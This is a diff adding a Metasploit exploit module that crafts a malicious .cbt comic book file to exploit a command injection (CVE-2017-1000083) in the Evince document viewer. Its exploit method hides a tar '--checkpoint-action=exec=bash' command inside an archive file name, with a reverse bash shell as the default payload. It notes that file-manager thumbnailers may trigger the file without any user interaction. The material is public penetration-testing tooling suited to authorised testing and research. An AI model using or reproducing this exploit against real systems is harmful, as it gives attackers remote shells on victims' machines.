@@ -1,0 +1,108 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'rex/zip'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Evince CBT File Command Injection',
+      'Description'    => %q{
+        This module exploits a command injection vulnerability in Evince
+        before version 3.24.1 when opening comic book `.cbt` files.
+
+        Some file manager software, such as Nautilus and Atril, may allow
+        automatic exploitation without user interaction due to thumbnailer
+        preview functionality.
+
+        Note that limited space is available for the payload (<256 bytes).
+        Reverse Bash and Reverse Netcat payloads should be sufficiently small.
+
+        This module has been tested successfully on evince versions:
+
+        3.4.0-3.1 + nautilus 3.4.2-1+build1 on Kali 1.0.6;
+        3.18.2-1ubuntu4.3 + atril 1.12.2-1ubuntu0.3 on Ubuntu 16.04.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Felix Wilhelm',     # Discovery
+          'Sebastian Krahmer', # PoC
+          'Matlink',           # Exploit
+          'bcoles'             # Metasploit
+        ],
+      'References'     =>
+        [
+          ['BID', '99597'],
+          ['CVE', '2017-1000083'],
+          ['EDB', '45824'],
+          ['URL', 'https://seclists.org/oss-sec/2017/q3/128'],
+          ['URL', 'https://bugzilla.gnome.org/show_bug.cgi?id=784630'],
+          ['URL', 'https://bugzilla.suse.com/show_bug.cgi?id=1046856'],
+          ['URL', 'https://bugs.launchpad.net/ubuntu/+source/atril/+bug/1735418'],
+          ['URL', 'https://bugs.launchpad.net/ubuntu/+source/atril/+bug/1800662'],
+          ['URL', 'https://access.redhat.com/security/cve/cve-2017-1000083'],
+          ['URL', 'https://security-tracker.debian.org/tracker/CVE-2017-1000083']
+        ],
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Payload'        =>
+        {
+          'Space'       => 215,
+          'BadChars'    => "\x00\x0a\x0d\x22",
+          'DisableNops' => true
+        },
+      'DefaultOptions'  =>
+        {
+          'PAYLOAD' => 'cmd/unix/reverse_bash',
+          'DisablePayloadHandler' => true
+        },
+      'Targets'        => [[ 'Automatic', {}]],
+      'Privileged'     => false,
+      'DisclosureDate' => '2017-07-13',
+      'DefaultTarget'  => 0))
+    register_options([
+      OptString.new('FILENAME', [true, 'The cbt document file name', 'msf.cbt'])
+    ])
+  end
+
+  def exploit
+    ext = %w[png jpg gif]
+    path = " --checkpoint-action=exec=bash -c \"#{payload.encoded};\".#{ext.sample}"
+
+    # Tar archive max path length is 256.
+    if path.length > 256
+      fail_with Failure::PayloadFailed, "Payload is too large (#{path.length}): Max path length is 256 characters"
+    end
+
+    # Tar archive max file name length is 100.
+    path.split('/').each do |fname|
+      if fname.length > 100
+        fail_with Failure::PayloadFailed, "File name too long (#{fname.length}): Max filename length is 100 characters"
+      end
+    end
+
+    # Create malicious tar archive
+    tarfile = StringIO.new
+    Rex::Tar::Writer.new tarfile do |tar|
+      tar.add_file path, 0644 do |io|
+        io.write ''
+      end
+      # Pad file to 1+ MB to trigger tar checkpoint action
+      tar.add_file rand_text_alphanumeric(10..20), 0644 do |io|
+        io.write rand_text(1_000_000..1_100_000)
+      end
+    end
+    tarfile.rewind
+    cbt = tarfile.read
+
+    print_status "Writing file: #{datastore['FILENAME']} (#{cbt.length} bytes) ..."
+    file_create cbt
+  end
+end
